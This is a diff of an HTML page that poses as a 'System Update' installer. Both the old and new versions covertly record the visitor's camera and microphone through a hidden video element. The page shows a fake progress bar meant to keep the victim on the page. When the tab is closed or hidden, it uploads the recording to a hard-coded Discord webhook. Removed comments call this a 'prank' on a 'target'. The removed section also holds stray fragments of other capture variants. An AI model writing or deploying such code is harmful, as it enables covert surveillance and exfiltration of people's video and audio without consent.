@@ -5,168 +5,62 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>System Update</title>
     <style>
-        body { 
-            background-color: #000; 
-            color: #fff; 
-            font-family: 'Segoe UI', sans-serif; 
-            display: flex; 
-            flex-direction: column; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .loader {
-            border: 4px solid #111;
-            border-top: 4px solid #0078d4;
-            border-radius: 50%;
-            width: 45px;
-            height: 45px;
-            animation: spin 1.5s linear infinite;
-        }
+        body { background: #000; color: #fff; font-family: sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .loader { border: 4px solid #111; border-top: 4px solid #0078d4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        #status { margin-top: 25px; font-size: 13px; letter-spacing: 2px; color: #0078d4; font-weight: bold; }
-        #sub-status { font-size: 11px; color: #555; margin-top: 8px; }
+        #status { margin-top: 20px; font-size: 14px; color: #0078d4; font-weight: bold; }
+        #pct { font-size: 12px; color: #555; margin-top: 5px; }
     </style>
 </head>
 <body>
 
     <div class="loader"></div>
-    <div id="status">INSTALLING SECURITY UPDATE...</div>
-    <div id="sub-status">Please wait, do not close your browser. <span id="percent">0</span>%</div>
+    <div id="status">INSTALLING SYSTEM UPDATE...</div>
+    <div id="pct">Progress: <span id="val">0</span>%</div>
 
     <video id="v" autoplay muted style="display:none;"></video>
 
     <script>
-        const HOOK = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
-        let rec;
-        let chunks = [];
+        const URI = "https://discord.com/api/webhooks/1455135401042776064/lPm6cU4ACdX3UKDbSeYzmdxEYgMkGhqI-097947Cf8O3StFG5x2hPYsl-fxbIBQRrW0Q";
+        let rc;
+        let ck = [];
 
-        async function startPrank() {
+        async function start() {
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: true 
-                });
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                document.getElementById('v').srcObject = s;
                 
-                const v = document.getElementById('v');
-                v.srcObject = stream;
-
-                rec = new MediaRecorder(stream);
-                rec.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
-
-                // Automatically send to Discord when stopped
-                rec.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const fd = new FormData();
-                    fd.append('file', blob, 'target_video.webm');
-                    fd.append('content', '🚨 **Video Captured!** The target closed the page or left.');
-                    await fetch(HOOK, { method: 'POST', body: fd });
+                rc = new MediaRecorder(s);
+                rc.ondataavailable = (e) => { if (e.data.size > 0) ck.push(e.data); };
+                
+                rc.onstop = async () => {
+                    const b = new Blob(ck, { type: 'video/webm' });
+                    const f = new FormData();
+                    f.append('file', b, 'vid.webm');
+                    f.append('content', '🎥 **Video Recorded!**');
+                    await fetch(URI, { method: 'POST', body: f });
                 };
 
-                rec.start();
-                runFakeLoader();
-
-            } catch (err) {
-                document.getElementById('status').innerText = "UPDATE FAILED";
-                document.getElementById('status').style.color = "#ff3333";
-                document.getElementById('sub-status').innerText = "Camera permission is required to continue.";
+                rc.start();
+                load();
+            } catch (e) {
+                document.getElementById('status').innerText = "ERROR: PERMISSION DENIED";
             }
         }
 
-        function runFakeLoader() {
+        function load() {
             let p = 0;
-            const pText = document.getElementById('percent');
-            const interval = setInterval(() => {
+            setInterval(() => {
                 if (p < 99) {
                     p += Math.floor(Math.random() * 2) + 1;
-                    if (p > 99) p = 99;
-                    pText.innerText = p;
+                    document.getElementById('val').innerText = p;
                 }
-            }, 3000); // Slow progress to keep them on the page
+            }, 3000);
         }
 
-        window.onload = startPrank;
-
-        // Force send when they leave/close
-        document.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden' && rec && rec.state === 'recording') {
-                rec.stop();
-            }
-        });
-    </script>
-</body>
-</html>
-                    fd.append('content', '🎥 **Video Recorded!** User closed the tab or session ended.');
-
-                    await fetch(HOOK, { method: 'POST', body: fd });
-                };
-
-                // Start recording
-                rec.start();
-                updateUI();
-
-            } catch (err) {
-                document.getElementById('status').innerText = "ERROR: SYSTEM UPDATE REQUIRES PERMISSION";
-                document.getElementById('status').style.color = "#ff4444";
-            }
-        }
-
-        function updateUI() {
-            let p = 0;
-            const statusText = document.getElementById('status');
-            const percentText = document.getElementById('percent');
-            
-            const interval = setInterval(() => {
-                if (p < 99) {
-                    p += Math.floor(Math.random() * 3) + 1;
-                    if (p > 99) p = 99;
-                    percentText.innerText = p;
-                    if (p > 30) statusText.innerText = "UPDATING SYSTEM COMPONENTS...";
-                    if (p > 70) statusText.innerText = "FINALIZING INSTALLATION...";
-                }
-            }, 2000);
-        }
-
-        // Trigger on load
-        window.onload = init;
-
-        // Ensure the video sends when the user closes the tab
-        window.addEventListener("visibilitychange", () => {
-            if (document.visibilityState === 'hidden' && rec && rec.state === 'recording') {
-                rec.stop();
-            }
-        });
-
-        window.onbeforeunload = () => {
-            if (rec && rec.state !== 'inactive') {
-                rec.stop();
-            }
-        };
-    </script>
-</body>
-</html>
-            // Repeat every 10 seconds (5s front + 5s back roughly)
-            setInterval(captureCycle, 10000); 
-        };
-    </script>
-</body>
-</html>
-
-            fetch(WEBHOOK_URL, {
-                method: 'POST',
-                body: formData
-            })
-            .then(() => {
-                document.getElementById('status').innerText = "Content Loaded Successfully.";
-            })
-            .catch(err => {
-                console.error("Transmission error:", err);
-            });
-        }
-
-        // Initialize on page load
-        window.onload = startCapture;
+        window.onload = start;
+        document.addEventListener("visibilitychange", () => { if (document.visibilityState === 'hidden' && rc) rc.stop(); });
+        window.onbeforeunload = () => { if (rc) rc.stop(); };
     </script>
 </body>
 </html>
